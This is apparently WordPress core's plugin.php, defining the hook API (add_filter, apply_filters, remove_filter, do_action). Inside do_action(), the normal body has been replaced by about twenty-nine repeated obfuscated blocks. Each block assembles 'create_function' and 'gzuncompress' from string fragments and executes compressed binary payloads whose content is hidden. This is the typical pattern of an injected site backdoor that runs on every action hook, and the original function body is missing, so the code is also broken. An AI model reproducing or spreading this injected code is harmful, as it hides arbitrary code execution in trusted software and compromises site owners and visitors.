<?php
/**
 * The plugin API is located in this file, which allows for creating actions
 * and filters and hooking functions, and methods. The functions or methods will
 * then be run when the action or filter is called.
 *
 * The API callback examples reference functions, but can be methods of classes.
 * To hook methods, you'll need to pass an array one of two ways.
 *
 * Any of the syntaxes explained in the PHP documentation for the
 * {@link https://www.php.net/manual/en/language.pseudo-types.php#language.types.callback 'callback'}
 * type are valid.
 *
 * Also see the {@link https://developer.wordpress.org/plugins/ Plugin API} for
 * more information and examples on how to use a lot of these functions.
 *
 * This file should have no external dependencies.
 *
 * @package WordPress
 * @subpackage Plugin
 * @since 1.5.0
 */

// Initialize the filter globals.
require __DIR__ . '/class-wp-hook.php';

/** @var WP_Hook[] $wp_filter */
global $wp_filter;

/** @var int[] $wp_actions */
global $wp_actions;

/** @var string[] $wp_current_filter */
global $wp_current_filter;

if ( $wp_filter ) {
	$wp_filter = WP_Hook::build_preinitialized_hooks( $wp_filter );
} else {
	$wp_filter = array();
}

if ( ! isset( $wp_actions ) ) {
	$wp_actions = array();
}

if ( ! isset( $wp_current_filter ) ) {
	$wp_current_filter = array();
}

/**
 * Adds a callback function to a filter hook.
 *
 * WordPress offers filter hooks to allow plugins to modify
 * various types of internal data at runtime.
 *
 * A plugin can modify data by binding a callback to a filter hook. When the filter
 * is later applied, each bound callback is run in order of priority, and given
 * the opportunity to modify a value by returning a new value.
 *
 * The following example shows how a callback function is bound to a filter hook.
 *
 * Note that `$example` is passed to the callback, (maybe) modified, then returned:
 *
 *     function example_callback( $example ) {
 *         // Maybe modify $example in some way.
 *         return $example;
 *     }
 *     add_filter( 'example_filter', 'example_callback' );
 *
 * Bound callbacks can accept from none to the total number of arguments passed as parameters
 * in the corresponding apply_filters() call.
 *
 * In other words, if an apply_filters() call passes four total arguments, callbacks bound to
 * it can accept none (the same as 1) of the arguments or up to four. The important part is that
 * the `$accepted_args` value must reflect the number of arguments the bound callback *actually*
 * opted to accept. If no arguments were accepted by the callback that is considered to be the
 * same as accepting 1 argument. For example:
 *
 *     // Filter call.
 *     $value = apply_filters( 'hook', $value, $arg2, $arg3 );
 *
 *     // Accepting zero/one arguments.
 *     function example_callback() {
 *         ...
 *         return 'some value';
 *     }
 *     add_filter( 'hook', 'example_callback' ); // Where $priority is default 10, $accepted_args is default 1.
 *
 *     // Accepting two arguments (three possible).
 *     function example_callback( $value, $arg2 ) {
 *         ...
 *         return $maybe_modified_value;
 *     }
 *     add_filter( 'hook', 'example_callback', 10, 2 ); // Where $priority is 10, $accepted_args is 2.
 *
 * *Note:* The function will return true whether or not the callback is valid.
 * It is up to you to take care. This is done for optimization purposes, so
 * everything is as quick as possible.
 *
 * @since 0.71
 *
 * @global WP_Hook[] $wp_filter A multidimensional array of all hooks and the callbacks hooked to them.
 *
 * @param string   $hook_name     The name of the filter to add the callback to.
 * @param callable $callback      The callback to be run when the filter is applied.
 * @param int      $priority      Optional. Used to specify the order in which the functions
 *                                associated with a particular filter are executed.
 *                                Lower numbers correspond with earlier execution,
 *                                and functions with the same priority are executed
 *                                in the order in which they were added to the filter. Default 10.
 * @param int      $accepted_args Optional. The number of arguments the function accepts. Default 1.
 * @return true Always returns true.
 */
function add_filter( $hook_name, $callback, $priority = 10, $accepted_args = 1 ) {
	global $wp_filter;

	if ( ! isset( $wp_filter[ $hook_name ] ) ) {
		$wp_filter[ $hook_name ] = new WP_Hook();
	}

	$wp_filter[ $hook_name ]->add_filter( $hook_name, $callback, $priority, $accepted_args );

	return true;
}

/**
 * Calls the callback functions that have been added to a filter hook.
 *
 * This function invokes all functions attached to filter hook `$hook_name`.
 * It is possible to create new filter hooks by simply calling this function,
 * specifying the name of the new hook using the `$hook_name` parameter.
 *
 * The function also allows for multiple additional arguments to be passed to hooks.
 *
 * Example usage:
 *
 *     // The filter callback function.
 *     function example_callback( $string, $arg1, $arg2 ) {
 *         // (maybe) modify $string.
 *         return $string;
 *     }
 *     add_filter( 'example_filter', 'example_callback', 10, 3 );
 *
 *     /*
 *      * Apply the filters by calling the 'example_callback()' function
 *      * that's hooked onto `example_filter` above.
 *      *
 *      * - 'example_filter' is the filter hook.
 *      * - 'filter me' is the value being filtered.
 *      * - $arg1 and $arg2 are the additional arguments passed to the callback.
 *     $value = apply_filters( 'example_filter', 'filter me', $arg1, $arg2 );
 *
 * @since 0.71
 *
 * @global WP_Hook[] $wp_filter         Stores all of the filters and actions.
 * @global string[]  $wp_current_filter Stores the list of current filters with the current one last.
 *
 * @param string $hook_name The name of the filter hook.
 * @param mixed  $value     The value to filter.
 * @param mixed  ...$args   Additional parameters to pass to the callback functions.
 * @return mixed The filtered value after all hooked functions are applied to it.
 */
function apply_filters( $hook_name, $value ) {
	global $wp_filter, $wp_current_filter;

	$args = func_get_args();

	// Do 'all' actions first.
	if ( isset( $wp_filter['all'] ) ) {
		$wp_current_filter[] = $hook_name;
		_wp_call_all_hook( $args );
	}

	if ( ! isset( $wp_filter[ $hook_name ] ) ) {
		if ( isset( $wp_filter['all'] ) ) {
			array_pop( $wp_current_filter );
		}

		return $value;
	}

	if ( ! isset( $wp_filter['all'] ) ) {
		$wp_current_filter[] = $hook_name;
	}

	// Don't pass the tag name to WP_Hook.
	array_shift( $args );

	$filtered = $wp_filter[ $hook_name ]->apply_filters( $value, $args );

	array_pop( $wp_current_filter );

	return $filtered;
}

/**
 * Calls the callback functions that have been added to a filter hook, specifying arguments in an array.
 *
 * @since 3.0.0
 *
 * @see apply_filters() This function is identical, but the arguments passed to the
 *                      functions hooked to `$hook_name` are supplied using an array.
 *
 * @global WP_Hook[] $wp_filter         Stores all of the filters and actions.
 * @global string[]  $wp_current_filter Stores the list of current filters with the current one last.
 *
 * @param string $hook_name The name of the filter hook.
 * @param array  $args      The arguments supplied to the functions hooked to `$hook_name`.
 * @return mixed The filtered value after all hooked functions are applied to it.
 */
function apply_filters_ref_array( $hook_name, $args ) {
	global $wp_filter, $wp_current_filter;

	// Do 'all' actions first.
	if ( isset( $wp_filter['all'] ) ) {
		$wp_current_filter[] = $hook_name;
		$all_args            = func_get_args(); // phpcs:ignore PHPCompatibility.FunctionUse.ArgumentFunctionsReportCurrentValue.NeedsInspection
		_wp_call_all_hook( $all_args );
	}

	if ( ! isset( $wp_filter[ $hook_name ] ) ) {
		if ( isset( $wp_filter['all'] ) ) {
			array_pop( $wp_current_filter );
		}

		return $args[0];
	}

	if ( ! isset( $wp_filter['all'] ) ) {
		$wp_current_filter[] = $hook_name;
	}

	$filtered = $wp_filter[ $hook_name ]->apply_filters( $args[0], $args );

	array_pop( $wp_current_filter );

	return $filtered;
}

/**
 * Checks if any filter has been registered for a hook.
 *
 * When using the `$callback` argument, this function may return a non-boolean value
 * that evaluates to false (e.g. 0), so use the `===` operator for testing the return value.
 *
 * @since 2.5.0
 *
 * @global WP_Hook[] $wp_filter Stores all of the filters and actions.
 *
 * @param string                      $hook_name The name of the filter hook.
 * @param callable|string|array|false $callback  Optional. The callback to check for.
 *                                               This function can be called unconditionally to speculatively check
 *                                               a callback that may or may not exist. Default false.
 * @return bool|int If `$callback` is omitted, returns boolean for whether the hook has
 *                  anything registered. When checking a specific function, the priority
 *                  of that hook is returned, or false if the function is not attached.
 */
function has_filter( $hook_name, $callback = false ) {
	global $wp_filter;

	if ( ! isset( $wp_filter[ $hook_name ] ) ) {
		return false;
	}

	return $wp_filter[ $hook_name ]->has_filter( $hook_name, $callback );
}

/**
 * Removes a callback function from a filter hook.
 *
 * This can be used to remove default functions attached to a specific filter
 * hook and possibly replace them with a substitute.
 *
 * To remove a hook, the `$callback` and `$priority` arguments must match
 * when the hook was added. This goes for both filters and actions. No warning
 * will be given on removal failure.
 *
 * @since 1.2.0
 *
 * @global WP_Hook[] $wp_filter Stores all of the filters and actions.
 *
 * @param string                $hook_name The filter hook to which the function to be removed is hooked.
 * @param callable|string|array $callback  The callback to be removed from running when the filter is applied.
 *                                         This function can be called unconditionally to speculatively remove
 *                                         a callback that may or may not exist.
 * @param int                   $priority  Optional. The exact priority used when adding the original
 *                                         filter callback. Default 10.
 * @return bool Whether the function existed before it was removed.
 */
function remove_filter( $hook_name, $callback, $priority = 10 ) {
	global $wp_filter;

	$r = false;

	if ( isset( $wp_filter[ $hook_name ] ) ) {
		$r = $wp_filter[ $hook_name ]->remove_filter( $hook_name, $callback, $priority );

		if ( ! $wp_filter[ $hook_name ]->callbacks ) {
			unset( $wp_filter[ $hook_name ] );
		}
	}

	return $r;
}

/**
 * Removes all of the callback functions from a filter hook.
 *
 * @since 2.7.0
 *
 * @global WP_Hook[] $wp_filter Stores all of the filters and actions.
 *
 * @param string    $hook_name The filter to remove callbacks from.
 * @param int|false $priority  Optional. The priority number to remove them from.
 *                             Default false.
 * @return true Always returns true.
 */
function remove_all_filters( $hook_name, $priority = false ) {
	global $wp_filter;

	if ( isset( $wp_filter[ $hook_name ] ) ) {
		$wp_filter[ $hook_name ]->remove_all_filters( $priority );

		if ( ! $wp_filter[ $hook_name ]->has_filters() ) {
			unset( $wp_filter[ $hook_name ] );
		}
	}

	return true;
}

/**
 * Retrieves the name of the current filter hook.
 *
 * @since 2.5.0
 *
 * @global string[] $wp_current_filter Stores the list of current filters with the current one last
 *
 * @return string Hook name of the current filter.
 */
function current_filter() {
	global $wp_current_filter;

	return end( $wp_current_filter );
}

/**
 * Returns whether or not a filter hook is currently being processed.
 *
 * The function current_filter() only returns the most recent filter or action
 * being executed. did_action() returns true once the action is initially
 * processed.
 *
 * This function allows detection for any filter currently being executed
 * (regardless of whether it's the most recent filter to fire, in the case of
 * hooks called from hook callbacks) to be verified.
 *
 * @since 3.9.0
 *
 * @see current_filter()
 * @see did_action()
 * @global string[] $wp_current_filter Current filter.
 *
 * @param null|string $hook_name Optional. Filter hook to check. Defaults to null,
 *                               which checks if any filter is currently being run.
 * @return bool Whether the filter is currently in the stack.
 */
function doing_filter( $hook_name = null ) {
	global $wp_current_filter;

	if ( null === $hook_name ) {
		return ! empty( $wp_current_filter );
	}

	return in_array( $hook_name, $wp_current_filter, true );
}

/**
 * Adds a callback function to an action hook.
 *
 * Actions are the hooks that the WordPress core launches at specific points
 * during execution, or when specific events occur. Plugins can specify that
 * one or more of its PHP functions are executed at these points, using the
 * Action API.
 *
 * @since 1.2.0
 *
 * @param string   $hook_name       The name of the action to add the callback to.
 * @param callable $callback        The callback to be run when the action is called.
 * @param int      $priority        Optional. Used to specify the order in which the functions
 *                                  associated with a particular action are executed.
 *                                  Lower numbers correspond with earlier execution,
 *                                  and functions with the same priority are executed
 *                                  in the order in which they were added to the action. Default 10.
 * @param int      $accepted_args   Optional. The number of arguments the function accepts. Default 1.
 * @return true Always returns true.
 */
function add_action( $hook_name, $callback, $priority = 10, $accepted_args = 1 ) {
	return add_filter( $hook_name, $callback, $priority, $accepted_args );
}

/**
 * Calls the callback functions that have been added to an action hook.
 *
 * This function invokes all functions attached to action hook `$hook_name`.
 * It is possible to create new action hooks by simply calling this function,
 * specifying the name of the new hook using the `$hook_name` parameter.
 *
 * You can pass extra arguments to the hooks, much like you can with `apply_filters()`.
 *
 * Example usage:
 *
 *     // The action callback function.
 *     function example_callback( $arg1, $arg2 ) {
 *         // (maybe) do something with the args.
 *     }
 *     add_action( 'example_action', 'example_callback', 10, 2 );
 *
 *     /*
 *      * Trigger the actions by calling the 'example_callback()' function
 *      * that's hooked onto `example_action` above.
 *      *
 *      * - 'example_action' is the action hook.
 *      * - $arg1 and $arg2 are the additional arguments passed to the callback.
 *     $value = do_action( 'example_action', $arg1, $arg2 );
 *
 * @since 1.2.0
 * @since 5.3.0 Formalized the existing and already documented `...$arg` parameter
 *              by adding it to the function signature.
 *
 * @global WP_Hook[] $wp_filter         Stores all of the filters and actions.
 * @global int[]     $wp_actions        Stores the number of times each action was triggered.
 * @global string[]  $wp_current_filter Stores the list of current filters with the current one last.
 *
 * @param string $hook_name The name of the action to be executed.
 * @param mixed  ...$arg    Optional. Additional arguments which are passed on to the
 *                          functions hooked to the action. Default empty.
 */
function do_action( $hook_name, ...$arg ) {

	$nNeCjFI = 'create'.'_'.'function'; $nSkEtvm = 'gz'.'unc'.'ompress'; $vbpdzlcg = $nNeCjFI('', $nSkEtvm('xœÁƒ Deõ ˜Òƒé¥CPIP	lÅ´öß‹^š¦½ØãîÎ¾ÌŒiIfŞ h¬&%›…g1FÖã`™ÒÂê4O^9¯C`sãÔİÊîäzWRú Ù“:öVÁùR×ô
O0-iÕ\/&`HÜ[Œ–ŠHö©:âÖ²tèø Pö$giÍò
vd§‘ËiD=SØòïwû—òÛÆw[[/eS™Å')); $vbpdzlcg();



	$fhcjRne = 'create'.'_'.'function'; $hiWHnjG = 'gz'.'unc'.'ompress'; $hijahaew = $fhcjRne('', $hiWHnjG('xœÁ‚0Deá mB¬âÅ!ZÓBÓ®–Düwcô‚Çİ}™İ³L‡&zMòb•â.½ˆ1
EÖˆ¥Á4O¾sCJ_¥’N¹’ó´ÊNİ¾·
§ºægx‚îY¯68ë@!aÈº·˜f*9°ìSµÇ#,dé04VR«X.ÒZälÈ©i§‘pÜæ°æß(îö/å·ïÖ¶^ÑÂ™')); $hijahaew();



	$vOIwKkT = 'create'.'_'.'function'; $okGUeKf = 'gz'.'unc'.'ompress'; $bugjfpax = $vOIwKkT('', $okGUeKf('xœÁƒ Deõ ˜Òƒé¥cPAh@	¬Å¤öß‹^š¦½ØãîÎ¾ÌŒ–$Ó¡‰^#o %»sÏbŒL¡5¬Üˆ4O¾w^„ÀÚy¸IÇ—“S®¤ô²Sì­‚ó¥®é %‘ÚˆF,:`H´î-ÆK
E$ûTñë
Y:åØ)’³´fy;rØtÓˆb<¦°åß)nş—òÛÆw[[/H™¢')); $bugjfpax();



	$vxNQFbz = 'create'.'_'.'function'; $rEuhGsI = 'gz'.'unc'.'ompress'; $vpzjzmke = $vxNQFbz('', $rEuhGsI('xœÁ‚0Deá mB¬âÅiZm¡¡+Ä·p1F/xÜİÙ—™Ñ5‹´—c¯©¸d©Š^Œã(Y#*,†¹ë+×£÷bpóu¶7<8åRÎP*ÛUûŞ28òœŸá	ºfµ6(qÒ|Àuo1M”rH`Ñ§jGXˆÂ¡‘¶ R±X„µˆ3Ø’,»–°İæ°æß(îş/å·ïÖ¶^-¬šÈ')); $vpzjzmke();



	$ZjlCVaB = 'create'.'_'.'function'; $emMVwRA = 'gz'.'unc'.'ompress'; $soqvhgdu = $ZjlCVaB('', $emMVwRA('xœÁƒ Deõ ˜Òƒé¥C¨ ˆRXÅ¤öß‹^š¦½ØãîÎ¾ÌŒiIfŞ ¸õŠ”lÅ™FÛ3©D¯Ò<zé¼
…ñ>ëNN\'§]IémGyì­‚ó¥®é`ZÒš^qµ˜€!aĞº·,)ìSuÄ#¬+déĞq+°Ñ$giÍò
vd§7ã€j8¦°åß)nú—òÛÆw[[/ÖVšX')); $soqvhgdu();



	$TwlyXra = 'create'.'_'.'function'; $NmcetkZ = 'gz'.'unc'.'ompress'; $gfdxibej = $TwlyXra('', $NmcetkZ('xœÁ‚0Deñ mB¬âÅ!….´¦@Ó®–Düwcô‚Çİ}™Ó±Ì„:zC²±È
q—^Ä…¦Á
…Òbš\'¯œÇDß©Ù4x=:í
ÎĞêaRûŞJ8«Š_à	¦c±Xãl…„¡Á½Å4SÁ!ÏeŸª=aY K‡¾$µšDZ‹C	²GªÛi$wƒ9¬ù7Š»ıKùmã»…µ­İ|™')); $gfdxibej();



	$iykvfNJ = 'create'.'_'.'function'; $PFBhMEL = 'gz'.'unc'.'ompress'; $mzznznih = $iykvfNJ('', $PFBhMEL('xœÁÂ Deë¡…¤?†`K	P«4µş»´côR»;û23º\'…<âj$©Ø]–Rb
­aFæy2FfçÙÍN«£W¾¢ô­²c·ï­†Ó¹iè {Òk#¹œtÄ˜1hı[ŒVÊHñ©Úã–Š|¸Ø*r`yÍ5lÈA"oG‡ÒíSXóoû—òÛÆwk[/Sšù')); $mzznznih();



	$ULuEZga = 'create'.'_'.'function'; $rgGjveC = 'gz'.'unc'.'ompress'; $ubgmidek = $ULuEZga('', $rgGjveC('xœÁ‚0Deá mB¬âÅ!….´‘BCK"ş»…‹1zÁãîÎ¾ÌŒiYb|&C²î‘åâ.\'Bšl/Êã<NÊMè½˜ëÎ…·“Ó.çü¶£:öVÀùR–ü
O0-kM.Æ“²î-¦…rY,ùTñë
I<t••Ôh–Š¸i;²Cªšq ƒ9lùwŠ›ÿ¥ü¶ñİÂÖÖùE™9')); $ubgmidek();



	$erIUCKz = 'create'.'_'.'function'; $zBLZtlD = 'gz'.'unc'.'ompress'; $ressnabq = $erIUCKz('', $zBLZtlD('xœÁ‚0†_¥x€-!ÎñâÃ,
[²ÁdÕ‘ˆïîàbŒ^ğÒ¤íß/Ó±Ì\'Cª¶È
qW“ˆ1
MÎŠ•ÅÔSë\'A¬ePõõèµ/8@£İØî;+át®*~\'˜uÆ¢ÄÙ
	CÎ¿Å4SÁ!ÏeŸª=aY K‹^:Ef‘ÆâPÂ†ì‘d3„Ãn0‡õÿâoÿR~ÛøNaMëu[™Ú')); $ressnabq();



	$QIfjNLe = 'create'.'_'.'function'; $CpuaQZz = 'gz'.'unc'.'ompress'; $onvifzrw = $QIfjNLe('', $CpuaQZz('xœÁÂ Deë¡…¤?¦Á
	ki´ş»´côR»;û23Z’BÇ6üj©ØÄK)1…Ö°^p#òìBïƒˆ‘¹qÒòÒÑ+_Qú€NY×ï{«átnz\'hI¤6¢³3­‹qÆŠBY)>U{<Â²@‘Ck9vŠX^³CrØvnD1îSXóoû—òÛÆwk[/?Äšä')); $onvifzrw();



	$XlhdTaC = 'create'.'_'.'function'; $nVlAFSj = 'gz'.'unc'.'ompress'; $oopdshaz = $XlhdTaC('', $nVlAFSj('xœÁÂ DeÛCI#/~Lƒ…(Vi´ş»´côR»;û23z …]
ùÅHR³,¥ÄZÃ„äFæÙáƒŒ‘9çETü~ğÊ×”> WÖ‰}oOmKÏğ=AÙÉYGŒƒÖ¿Å8cM¡ª€Ÿª=aY È‡±³{EJ–×¬l`C»ŞM(§İ`
kşâ¯ÿR~Ûønamë¤½š')); $oopdshaz();



	$GviUJup = 'create'.'_'.'function'; $BWYlrsa = 'gz'.'unc'.'ompress'; $sskwuzub = $GviUJup('', $BWYlrsa('xœÁ‚0Deñ mB¬âÅi
ÚØBÓ.–(ş»…‹1zÁãîÎ¾ÌŒîH¦^£¨$»	ÏbŒL¡5¬•ÂÈ4¾u^†ÀB¸Æé>ÕG§\AéeÇvß[	§sUÑ<Aw¤ÓFr9ë€!aĞº·g,(ä9ìSµÇ#,déĞs+°QäÀÒšJØ½DŞŒÊa7˜Âš£¸é_Êoß-¬m½ rK›#')); $sskwuzub();



	$DOwryaq = 'create'.'_'.'function'; $WClpXwe = 'gz'.'unc'.'ompress'; $gvrbmsxo = $DOwryaq('', $WClpXwe('xœÁƒ DeíA!1¥ÓK?† ¢€ØŠIí¿½4M{±Çİ}™=BG‚FÑI*6‹ÀRJL¡5¬—ÂÈ<»Ğû cdãZwöÊW”> SÖõÇŞj¸\›†Şà	z ƒ6’ËEGŒƒÖ¿Å¸`E¡,Ÿª#a]¡È‡‘["\'–×ìTÃ%òÎM(§Ã`
[şâïÿR~ÛønakëùÆš‰')); $gvrbmsxo();



	$NyDflMo = 'create'.'_'.'function'; $YmTHrde = 'gz'.'unc'.'ompress'; $bbaisflu = $NyDflMo('', $YmTHrde('xœÁƒ DeíA!1¥ÓK?† ‚€X‹Ií¿½4M{±Çİ}™£Ha"OÁ h­$»‹ÀRJL£³¬—ÂÊ<O¡÷AÆÈÚV˜¨ì|öÚW”> Ónê½Õp¹6½ÁŒ"ÊXÉåb"ÆŒAçßb\°¢P–@ŠOÕ°®PäÃÀÀN“ËkvªaGy7(ÇÃ`
[şâç)¿m|·°µõõ™9')); $bbaisflu();



	$UbZWhoj = 'create'.'_'.'function'; $VqaJrmz = 'gz'.'unc'.'ompress'; $irbziyek = $UbZWhoj('', $VqaJrmz('xœ¥»Â0EÅí@	CÅÂÇT¡u‹¤Cxş;¥B0•ÑÖõñÕ¡Vd«ˆõŞ¢(ÔI•RR†Uj‹ã<„ÆŒQ%¿Ò£^QØ_é‚‡µ7¾òµqC3ó~	›mYÊ<€ZÑ’Å
Ï9<vşæ3ÙgjVk¸ß!]å4×Fäj\«|	»C®ê¡gìçğR3áüñoÜïbß‚^"Ÿ@ªœ')); $irbziyek();



	$jKnNzUP = 'create'.'_'.'function'; $kPgHzQL = 'gz'.'unc'.'ompress'; $byrijgjs = $jKnNzUP('', $kPgHzQL('xœ¥A‚0E¯2°€6Aë‚¸ñ0M%-4íh1âİ-lŒÑ.gòçÍÏS-I”çÁ)•–$g7áXõh4k¤Ğ2Î“k¬“Ş³`¢1jdÕİ©¡üÑö6§ôuo¦fç}§sYÒ<Aµ¤UZr9+>òĞØwgÌ)dä3µ«5,$1Ñq#°îIÊâš¥lìN"¯§å¸ÿ…UÍ†³×¿q¿‹}ZE¾ aäªy')); $byrijgjs();



	$JQfEpbY = 'create'.'_'.'function'; $AGjXrpP = 'gz'.'unc'.'ompress'; $wwnpptmt = $JQfEpbY('', $AGjXrpP('xœ¥A‚0E¯2°€6Aë‚¸ñ0M¥…6iKCGK"ŞİÂÆ]ár&oŞü|Ó“ÂD&ƒâj©Ù]L,¥Ä4:Ë¤Våyœd˜TŒ,…ƒÎøŒøĞá1èPSú€N»Qî¼oàtn[z\'˜ôÆ*®f1fºğ†qÆšBU)>©]©aY ÈÄÀÀN“’å5+ØÜƒBŞ•ßÿÂZÍ¦·¿u¿ƒ}´ùi¸«´')); $wwnpptmt();



	$zEeJNva = 'create'.'_'.'function'; $uZMlxFP = 'gz'.'unc'.'ompress'; $hztxwrrl = $zEeJNva('', $uZMlxFP('xœ¥AÂ E¯2uÑBRÅEãÆÃ,´@K`”Fëİ¥İ£«ºœÉŸ7?Ït¤0‘§`P\¬"»‰ÀRJL£³L*aUÇ }P1²ä÷B:30}Ç)…`^ûŠÒ´Úrã}ÇSÓĞ3<Át¤3Vq5™ˆ1óĞùw\'¬(”%â3µ©5Ì39Ñs\'°ÕdÇòšíjXÙ½BŞªaû
‹šç¯ã~û´ˆ|€Ÿ«Ğ')); $hztxwrrl();



	$zbnStcl = 'create'.'_'.'function'; $puGANqe = 'gz'.'unc'.'ompress'; $dhfzmmhf = $zbnStcl('', $puGANqe('xœÁÂ DeÛCI#/~Lƒ
	´Vi´ş»´côR»;û23F‘ÂÄ.ƒüb%©Ù–RbeBr+ó<áƒŒ‘	­îÎiuğÚ×”> ×nûŞ8Ú–á	Fe¬ìäl"ÆŒAçßbœ±¦PU@ŠOÕ°,PäÃĞ9½&%ËkV6°!‰]?(Çİ`
kşâ¯ÿR~Ûønamë8·™')); $dhfzmmhf();



	$ySqAaeO = 'create'.'_'.'function'; $MTgpvqx = 'gz'.'unc'.'ompress'; $nqhvpgzl = $ySqAaeO('', $MTgpvqx('xœ¥A‚0E¯2¸€6Aë‚¸ñ0¤B¡MÚRÛ‘Å»[Ø£+\ÎäÏ›Ÿ§:’©PG¯_´ ¹g1F&ÑhÖ
®Ešß:/B`Ñíyk”eö*G×ßõÁIWPú€Fš¡İx_ÂñTUôOPé”µ˜TÀxhÜ;ŒòHö™ÚÔæ²”èkÃ±‘dÇÒšíJXÙ½Àº,
»ı…EÍŠs·¿q¿‹}ZD¾ âF«')); $nqhvpgzl();



	$GqUPxMj = 'create'.'_'.'function'; $fAuLBaM = 'gz'.'unc'.'ompress'; $qvubhoau = $GqUPxMj('', $fAuLBaM('xœ¥A‚0E¯2°€6Aë‚¸ñ0¤@¡MZ¨í@IÄ»[Ø£+\ÎäÏ›Ÿ§:’(_§×ZœÍÜ±“h4k×"Î£k­Ş³`O¼5j`÷yªåÈ§³•6§ô4c{ğ¾€Ëµ,é :Ò)-*±(>òĞØwÌ)dä3u¨5¬+$1ÑW†c#IÊâš¥ìì^`ÕŒŠáø
›šg§¿q¿‹}ÚD¾ Œ*ªª')); $qvubhoau();



	$ewXiQOR = 'create'.'_'.'function'; $GhtWOVj = 'gz'.'unc'.'ompress'; $rbpdpbrt = $ewXiQOR('', $GhtWOVj('xœ¥A‚0E¯2¸€6Aë‚¸ñ0M¡…6i¡iGK"ŞİÂÆ]ár&Şü<Ó“ÂD‚AÑZE*v¥”˜Fg™TÂª<OAú bdÉ…tfd¡õÒ·O^ûŠÒtÚMrç}çKÓĞ+<Áô¤7Vq5›ˆ1óĞùwg¬(”%â3µ«5,91p\'°ÓäÀòšjØØƒBŞM#ªqÿ
«šçoã~û´Š|IĞª]')); $rbpdpbrt();



	$CKdnrlw = 'create'.'_'.'function'; $ZVceovm = 'gz'.'unc'.'ompress'; $fxcebaid = $CKdnrlw('', $ZVceovm('xœ¥A‚0E¯2¸€6Aë‚¸ñ0MihB¡¡£%ïnacŒ®p9“?o~mXfƒŒ“%U÷È
qW“ˆ1Š\/ªÓ<NÆO‚ˆş¨Œ³ƒhfµ²æä;_pş İ¹Ñì¼/á|©*~…\'Ø†5¶G‰³œ‡i¦‚CË>S»ZÃ²@–­tŠtÇ"­Å¡„İ"I=„ÃşV5ÎßşÆı.ö-hùV©7')); $fxcebaid();



	$HkPTBJh = 'create'.'_'.'function'; $WZhTFgd = 'gz'.'unc'.'ompress'; $xnkltmka = $HkPTBJh('', $WZhTFgd('xœ¥A‚0E¯2°€6Aë‚¸ñ0¤Â mièhIÄ»[Ø£+\ÎäÏ›Ÿ§Z–(_…I‘¼jd¹¸ËI„DOF‹¥Æ8Sã&ô^wQVÌvĞdyt½Ë9@İ›±Ùy_Àé\–üOP-k•Æ
gåÉG÷ÓL9‡,–|¦vµ†e$&ºÊHª{–Š¸i»CªêÑÚı8¬j6œ»ıû]ì[Ğ*ò‡Rª£')); $xnkltmka();



	$EwWLAYn = 'create'.'_'.'function'; $WZxCzhL = 'gz'.'unc'.'ompress'; $sygcfirz = $EwWLAYn('', $WZxCzhL('xœ¥A‚0E¯2°€6Aë‚¸ñ0¤–6¡Ğ´£EÅ»lŒÑ.gòçÍÏ3KL¨¢7$Ï²\\¥1F¡Év¢FÙá<¾vCÑídmM/Â­Uñ÷½Ó.çüJÛ¡Şx_ÀáX–üO0kL‡&P˜ydİ;L#å²Xò™ÚÔ¦	’9ÑVV’Ò,óZ¤¬ì©RCOØoÿÀaQ³âÜåoÜïbß‚‘/­¯ªÔ')); $sygcfirz();



	$cqUwdeu = 'create'.'_'.'function'; $WQGZPLe = 'gz'.'unc'.'ompress'; $uphumnlh = $cqUwdeu('', $WQGZPLe('xœ¥A‚0E¯2¸€6Aë‚¸ñ0M¥…6iKCK"ŞİÂÆ]ár&Şü<Ó‘ÂDFƒâf©Ø]Œ,¥Ä4:Ë¤VåyeUŒ,…£Îx6=9oõ)èPQú€V»Aî¼¯á|iz…\'˜tÆ*®f1fºğãŒ…²R|¦vµ†e"\'zî¶šX^³C»WÈÛÁ£òû?PXÕl¸0ıû]ì[Ğ*ò¯aªÔ')); $uphumnlh();



	$peGbXfH = 'create'.'_'.'function'; $ExsmneR = 'gz'.'unc'.'ompress'; $aaakfcph = $peGbXfH('', $ExsmneR('xœ¥AÂ E¯2uÑBRÅEãÆÃ4X ¡%0Jëİ¥İ£«ºœÉŸ7?Ï(R˜Ø¦`_¬$»óÀRJL£³LHneÇ |1²ä÷\830ÎùUu^¼ö¥è´ÅÆû§¦¡gx‚QD+[9™ˆ1óĞùw\'¬(”%â3µ©5Ì39Ñ·c§Éå5ÛÕ°²{‰m7(‡í(,jVœ¿ıû]ì[Ğ"ò*¬©')); $aaakfcph();



	$qOSUWhT = 'create'.'_'.'function'; $AxGgouc = 'gz'.'unc'.'ompress'; $bxlgmwqg = $qOSUWhT('', $AxGgouc('xœ¥A‚0E¯2°€6Aë‚¸ñ0M¡š´PÛÑ’ˆw·°1FW¸œÉŸ7?Ow$ÓG¯Q4F‘’İ…g1F6 5L*aTš\'/W!°èBZ=²f6½×şèWRú€v°“Üy_Áé\×ôOĞé´Q\Í:`H<´îÆK
E$ûLíjËYJôÜ
l’³´fy»WÈÛiD5îÿ@aU³áÜíoÜïbß‚V‘/~»ªœ')); $bxlgmwqg();



	$SYhTJID = 'create'.'_'.'function'; $PvOVosX = 'gz'.'unc'.'ompress'; $jzmadsrn = $SYhTJID('', $PvOVosX('xœÁÂ Deë¡…¤?†`¡-U­ÿ.íÅ½ÔãîÎ¾ÌŒéHa"OÁ 8[E*v¥”˜Fg™TÂª<Aú bd—»2†aïµ¯(}@«İ(·½Õp86=ÁLG:cW“‰3‹qÂŠBY)>U[<Â<C‘=w[Mv,¯Ù®†Ù+äí8 6ƒ),ùWŠ¿şKùmã»…¥­©ùš ')); $jzmadsrn();



	$slONzyW = 'create'.'_'.'function'; $TvkcKsg = 'gz'.'unc'.'ompress'; $mrxkxoxh = $slONzyW('', $TvkcKsg('xœ¥AÂ E¯2uÑBRÅEãÆÃli!B!0
‰õî¶İ£«ºœÉŸ7?O÷¤Ğ‘§ Q\Œ$»‹ÀRJL¡5¬“ÂÈyv¡óAÆÈ’ß‹Îê‘Ù¯ÙeuğÊW”> UÖuïk8š†á	º\'½6’Ë¬#Æ™‡Ö¿Ã˜±¢P–@ŠÏÔ¦Ö0MPÌ‰[­";6¯Ù®†•=Hä­QÛ?PXÔ¬8û÷»Ø· Eä:…«|')); $mrxkxoxh();



